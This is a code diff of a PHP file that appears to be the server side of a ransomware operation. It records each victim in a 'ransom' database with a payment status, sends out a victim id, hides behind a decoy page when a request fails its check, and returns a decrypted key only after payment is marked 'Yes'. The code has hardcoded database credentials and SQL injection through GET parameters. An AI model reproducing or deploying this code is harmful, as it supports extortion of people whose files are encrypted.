@@ -1,30 +1,14 @@
 <?php
 
-//Configuration of database
-$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
-if(!$dbconn)
-{
-	echo "An error Ocurred!\n";
-	exit;
-}
-
-function keyPairGeneration(){
-	//Setting up Key Pair for encryption
-	$config = array(
-		"digest_alg" => "sha512",
-		"private_key_bits" => 512,
-		"private_key_type" => OPENSSL_KEYTYPE_RSA,
-	);
-	$res = openssl_pkey_new($config);
-	openssl_pkey_export($res,$privKey);
-	$pubKey = openssl_pkey_get_details($res);
-	$pubKey = $pubKey["key"];
-	//echo $pubKey;
-	//echo $privKey;
-	$keys = new StdClass();
-	$keys->privKey = $privKey;
-	$keys->pubKey = $pubKey;
-	return $keys;
+function Connection(){
+	//Configuration of database
+	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
+	if(!$dbconn)
+	{
+		echo "An error Ocurred!\n";
+		exit;
+	}
+	return $dbconn;
 }
 
 function getRequestHeaders(){
@@ -60,55 +44,65 @@ function hide(){
 	</html>";
 }
 
-function returnPrivate($id){
-	$query = "SELECT payment_status FROM ransomware_details where identifier='$id'";
+function returnDecrypted($dbconn,$key,$id){
+	$query = "SELECT payment_status from ransomware_details where identifier='$id';";
 	$result = pg_query($dbconn,$query);
-	echo "$result@";
-	if ($result == 'No')
-		echo "Not paid ransom";
-	else if ($result == "Yes"){
-		$query = "SELECT private_key from ransomware_detials where identifier='$id'";
-		$result = pg_query($dbconn,$query);
-		echo $result;
+	$tmp = pg_fetch_row($result)[0];
+	if($tmp == 'Yes'){
+		$private_key = file_get_contents("private.pem");
+		$resStr = str_replace('-','+',$key);
+		$res = openssl_get_privatekey($private_key);		
+		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
+		echo "$newsource";
+		return 1;
+
+	}
+	else if($result == 'No'){
+		return 1;
+		echo "Pay the ransom";
 	}
 	else{
-		//Database error
 		exit;
 	}
 }
 
-function check1(){
-	if( isset($_GET['decrypt'])){
-		$id = $_GET['decrypt'];
-		returnPrivate($id);
+function check1($dbconn){
+	if( isset($_GET['decrypt']) && isset($_GET['id'])){
+		$key = $_GET['decrypt'];
+		$id = $_GET['id'];
+		//echo "$key";
+		returnDecrypted($dbconn,$key,$id);
+		return 1;
 	}
 }
 
-
 if(checkValidity()){
-	check1();
+	$dbconn = Connection();
+	if(check1($dbconn)){
+		exit;
+	}
 	$result = pg_query($dbconn, "SELECT identifier FROM ransomware_details ORDER BY identifier DESC LIMiT 1;");
 	//echo "Working!";
 	if(!$result){
+		pg_close();
 		abort();
 		exit;
 	}
 	$id=pg_fetch_row($result)[0];
 	$id = $id+1;
-	$priv =  keyPairGeneration()->privKey;
-	$pub =  keyPairGeneration()->pubKey;
-	//echo $priv;
-	//echo $pub;
-	$query = "INSERT INTO ransomware_details (identifier,public_key,private_key) VALUES "."( '$id','$pub','$priv')";
+	$query = "INSERT INTO ransomware_details (identifier,payment_status) VALUES "."( '$id','No');";
 	$result = pg_query($dbconn,$query);
 	//echo $result;
 	if(!$result){
+		pg_close();
 		abort();
 		exit;
 	}
+	else{
 	//Finally send the public key after all checks
-	echo "$id@\n";
-	echo $pub;
+		echo "$id";
+		pg_close();
+	}
 }
 else{
 	hide();
